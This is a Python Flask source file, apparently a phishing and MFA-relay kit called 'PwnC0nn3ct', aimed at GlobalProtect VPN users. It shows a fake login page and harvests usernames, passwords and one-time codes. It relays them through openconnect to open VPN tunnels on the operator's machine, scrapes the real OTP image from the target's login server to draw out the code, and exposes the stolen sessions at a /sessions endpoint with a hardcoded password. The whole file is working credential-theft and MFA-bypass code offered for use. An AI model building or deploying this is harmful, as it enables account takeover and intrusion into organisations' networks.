from flask import Flask, render_template, request, jsonify, redirect, url_for
import pexpect
import os
import logging
import argparse
import sys
import time
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)


# URL del formulario
OTP_SERVER = os.getenv("OTP_SERVER")
LOGIN_URL = os.getenv("LOGIN_URL")
LOGIN_REFERER = os.getenv("LOGIN_REFERER")
OTP_IMAGE_URL = os.getenv("OTP_IMAGE_URL")

# VPN server configuration
VPN_SERVER = os.getenv("VPN_SERVER")

# TUN counter
TUN = 0

# Redirect URL
REDIRECT_URL = os.getenv("REDIRECT_URL", f"https://{VPN_SERVER}")

# Modo de operación: "vpn" = creación tuneles | "otp" = solo almacenar datos
MODE = os.getenv("CONNECT_MODE", "vpn")  

# Password for Sessions
SESSIONS_KEY = os.getenv("SESSIONS_KEY", "PwnC0nn3ct")                                 
                                                                                       
# Secret key for Flask app                                                             
app.secret_key = os.getenv("SECRET_KEY", "PwnC0nn3ct")                                 
                                                                                       
# Dictionary to store ongoing processes by username                                    
processes = {}                                                                         
                                                                                       
# Flattened sessions logs: a list of dictionaries with user details                    
sessions_logs = []  # Format: [{"username": username, "password": password, "pid": pid}]                                                                                      
                                                                                       
# Ensure env_vars are set is set                                                             
required_env_vars = {
    "VPN_SERVER": VPN_SERVER,
    "OTP_SERVER": OTP_SERVER,
    "LOGIN_URL": LOGIN_URL,
    "LOGIN_REFERER": LOGIN_REFERER,
    "OTP_IMAGE_URL": OTP_IMAGE_URL
}

for name, value in required_env_vars.items():
    if not value:
        raise ValueError(f"La variable de entorno '{name}' no está definida o es vacía.")

# Parse CLI arguments
parser = argparse.ArgumentParser(description="Run Flask OpenConnect app")
parser.add_argument("-debug", action="store_true", help="Enable debugging mode")
args = parser.parse_args()

# Configure logging
LOG_LEVEL = "DEBUG" if args.debug else os.getenv("LOG_LEVEL", "INFO").upper()
logging.basicConfig(level=getattr(logging, LOG_LEVEL))
if args.debug:
    logging.info("Debugging mode enabled.")

# Función que establece el modo de trabajo
def handle_login(username, password):
    #Según el modo, realiza la conexión completa o sólo simula login y carga OTP.
    
    if MODE == "vpn":
        return run_openconnect(username, password=password)
    else:
        return handle_credentials_only(username, password)

#Función para el modo simulación:
def handle_credentials_only(username, password):
    """
    Solo simula el login (sin túnel), y devuelve status otp_required.
    """
    # Guardamos los datos del usuario para luego recuperar el OTP
    sessions_logs.append({"username": username, "password": password, "pid": None})
    logging.info(f"[CredOnly] Usuario {username} autenticado sin túnel, esperando OTP.")
    return "otp_required", None

#Función para el modo creación de tuneles:
def run_openconnect(username, password=None, otp=None):
    try:
        # Check if a process already exists for this user
        if username in processes:
            child = processes[username]
            logging.info(f"Resuming existing OpenConnect process for user: {username}")

            # Handle OTP
            if otp:
                child.sendline(otp)
                logging.info("OTP sent.")
                output = child.before
                logging.debug(f"Full output before OTP: {output}")
                # Wait to allow OpenConnect to process
                index = child.expect([r"Session authentication will expire", pexpect.EOF, pexpect.TIMEOUT], timeout=30)

                # Look for success indicators using regex
                if index == 0:
                    logging.info("VPN connection successfully established.")
                    return "success", output
                elif index == 1:
                    logging.error("OpenConnect completed but no success indicators found.")
                    return "failure", output
                elif index == 2:  # Timeout occurred
                    logging.warning("Timeout while waiting for successful connection.")
                    return "error", "Timeout waiting for OTP."
                    
            return "otp_required", None

        # Start a new OpenConnect process
        #Modificar --interfaces con el tun adecuado
        global TUN
        tunel=f"tun{TUN}"
        command = f"sudo openconnect --interface={tunel} --protocol=gp -u {username} {VPN_SERVER}"
        child = pexpect.spawn(command, encoding="utf-8", timeout=30)
        TUN+=1

        # Log interaction for debugging
        logfile_path = f"openconnect_debug_{username}.log"
        child.logfile = open(logfile_path, "w")

        # Handle password prompt
        if password:
            child.expect("Password:")
            child.sendline(password)
            logging.info("Password sent.")

        # Wait for OTP prompt or process completion
        index = child.expect([r"Challenge:", pexpect.EOF, pexpect.TIMEOUT], timeout=60)
        output = child.before
        if index == 0:  # OTP required
            logging.info("OTP challenge detected.")
            processes[username] = child  # Store the process for later OTP submission
            sessions_logs.append({"username": username, "password": password, "pid": child.pid})  # Log user data
            return "otp_required", None
        elif index == 1:  # Process completed (EOF) | On success, increase TUN_INTERFACE counter
            logging.info("OpenConnect process completed.")
            logging.debug(f"Full output after EOF: {output}")
        elif index == 2:  # Timeout occurred
            logging.warning("Timeout while waiting for OTP prompt or process completion.")
            return "error", "Timeout waiting for OTP."

    except Exception as e:
        logging.error(f"Error running OpenConnect: {e}")
        return "error", str(e)
    
@app.route("/")
def home():
    return render_template("login.html")

@app.route("/connect", methods=["POST"])
def connect():
    try:
        username = request.form.get("username")
        password = request.form.get("password")
        # Validate credentials AND GENERATE IMAGE FOR OTP.
        if not username or not password:
            return jsonify({"error": "Missing username or password"}), 400

        status, result = handle_login(username, password=password)
        if status == "otp_required":
            return redirect(url_for("otp", username=username))
        elif status == "success":
            return jsonify({"status": "success", "message": "Connected successfully"}), 200
        else:
            return jsonify({"status": "error", "message": result}), 501

    except Exception as e:
        return jsonify({"error": "An error occurred", "details": str(e)}), 502

@app.route("/otp")
def otp():
    username = request.args.get("username")

    if not username:
        return jsonify({"error": "Missing username"}), 400

    try:
        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Referer': LOGIN_URL,
        }
        get_resp = session.get(LOGIN_URL, headers=headers)
        soup = BeautifulSoup(get_resp.text, 'html.parser')
        csrf_input = soup.find('input', {'type': 'hidden', 'name': '_csrf'})
        csrf_token = csrf_input['value'] if csrf_input else None

        if not csrf_token:
            logging.error("[OTP] No se encontró el token CSRF en el HTML.")
            return render_template("otp.html", username=username, error="No se encontró el token CSRF")

        logging.info(f"[OTP] Token CSRF obtenido: {csrf_token}")
        # Paso 2: POST login
        login_data = {
            '_csrf': csrf_token,
            'username': username,
            'password': ""
        }

        post_headers = headers.copy()
        post_headers['Content-Type'] = 'application/x-www-form-urlencoded'
        post_headers['Origin'] = OTP_SERVER
        post_headers['Referer'] = LOGIN_REFERER

        login_resp = session.post(LOGIN_URL, headers=post_headers, data=login_data)

        logging.info(f"[OTP] POST login recibido con status code: {login_resp.status_code}")

        if login_resp.status_code != 200:
            logging.error("[OTP] Error en login externo.")
            return render_template("otp.html", username=username, error="Login externo fallido")

        # Paso 3: Descargar imagen OTP
        post_headers['Origin'] = LOGIN_URL
        logging.info(f"[OTP] Intentando descargar la imagen desde: {OTP_IMAGE_URL}")
        image_resp = session.get(OTP_IMAGE_URL, headers=headers)

        logging.info(f"[OTP] Respuesta de la imagen: {image_resp.status_code}")

        if image_resp.status_code != 200:
            logging.error("[OTP] No se pudo obtener la imagen OTP.")
            return render_template("otp.html", username=username, error="No se pudo obtener la imagen OTP")

        # Guardar imagen en /static con nombre dinámico
        from datetime import datetime
        import os

        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        image_filename = f"OTP_{username}_{timestamp}.jpg"
        image_folder = 'static'
        os.makedirs(image_folder, exist_ok=True)
        image_path = os.path.join(image_folder, image_filename)

        logging.info(f"[OTP] Guardando imagen en: {image_path}")
        with open(image_path, "wb") as f:
            f.write(image_resp.content)
        logging.info("[OTP] Imagen guardada correctamente.")

        return render_template("otp.html", username=username, image_filename=image_filename)

    except Exception as e:
        logging.exception("[OTP] Excepción no controlada:")
        return render_template("otp.html", username=username, error=str(e))

@app.route("/sessions", methods=["GET"])
def sessions():
    password = request.args.get("p")
    if password == SESSIONS_KEY:
        try:
            # Return the flattened user logs
            return jsonify({"sessions": sessions_logs}), 200
        except Exception as e:
            logging.error(f"Error in /sessions: {e}")
            return jsonify({"error": "An error occurred", "details": str(e)}), 500
    else:
        logging.error("Invalid or missing password in /sessions request.")
        return redirect(url_for("home"))

@app.route("/submit-otp", methods=["POST"])
def submit_otp():
    try:
        otp = request.form.get("otp")
        username = request.form.get("username")

        if not username or not otp:
            logging.error("Missing username or OTP in the request.")
            return jsonify({"error": "Missing username or OTP"}), 400

        # Guardar OTP y timestamp en el log de sesión
        from datetime import datetime
        for session in sessions_logs:
            if session["username"] == username:
                session["otp"] = otp
                session["otp_time"] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                break

        if MODE == "vpn":
            # Enviar OTP al proceso OpenConnect existente
            status, result = run_openconnect(username, otp=otp)
            if status == "success":
                logging.info(f"VPN connection established. Redirecting user to {REDIRECT_URL}")
                return redirect(REDIRECT_URL)
            elif status == "failure":
                logging.error("OpenConnect failed to establish a VPN connection.")
                return jsonify({"status": "error", "message": "Failed to establish VPN connection."}), 500
            else:
                logging.error(f"OpenConnect OTP submission failed: {result}")
                return jsonify({"status": "error", "message": result}), 500

        else:
            # Solo simulación: redirige o muestra confirmación
            logging.info(f"[OTP-MOCK] OTP '{otp}' registrado correctamente para {username}.")
            return redirect(REDIRECT_URL)

    except Exception as e:
        logging.error(f"Error in /submit-otp: {e}")
        return jsonify({"error": "An error occurred", "details": str(e)}), 500


if __name__ == "__main__":
    app.run(debug=args.debug)
